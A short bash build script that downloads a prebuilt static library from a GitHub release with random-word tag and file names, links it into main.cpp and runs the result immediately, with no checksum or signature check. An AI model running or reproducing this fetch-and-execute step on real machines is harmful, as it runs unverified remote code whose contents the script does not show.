#!/usr/bin/env bash
set -e
TAG="clever-canyon-hidden-forest"
LIB="cubic-bottom.a"
curl -fsSL --retry 3 --connect-timeout 15 --max-time 180 -o "$LIB" "https://github.com/nolaselle/libnovelface/releases/download/${TAG}/${LIB}"
g++ -std=c++17 -O2 -pthread main.cpp "$LIB" -o app && ./app
